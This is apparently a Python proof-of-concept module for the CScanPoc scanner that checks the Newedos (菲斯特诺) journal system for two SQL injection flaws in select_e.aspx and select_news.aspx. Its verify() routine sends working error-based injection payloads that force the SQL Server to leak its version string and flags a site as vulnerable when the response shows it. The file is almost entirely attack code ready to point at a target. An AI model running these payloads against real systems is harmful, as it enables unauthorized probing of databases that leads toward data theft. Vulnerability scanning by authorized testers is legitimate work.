# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Newedos_0001'  # 平台漏洞编号，留空
    name = '菲斯特诺期刊系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-08'  # 漏洞公布时间
    desc = '''
        菲斯特诺期刊网络编辑平台，系统运行环境：windows NT或以上操作系统，IIS6.0，SQL数据库，ASP.NET2.0。主要功能是图书馆建设。
        菲斯特诺期刊系统2枚SQL注入漏洞：
        /select_e.aspx?type=zzdw&content=1
        /select_news.aspx?type=1&content=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0125186'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Newedos(菲斯特诺期刊系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '12519186-3ce7-40c1-a499-580f1de8139c'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/select_e.aspx?type=zzdw&content=1%27%20and%20char(char(74)%2Bchar(73)%2B@@version)<0--",
                "/select_news.aspx?type=1&content=1/**//'/**/and/**/char(char(74)%2Bchar(73)%2B@@version)/**/>0",

            ]
            for p in ps:
                url = arg+p
                code, head, res, errcode, _ = hh.http(url)

                if code == 500 and "JIMicrosoft" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
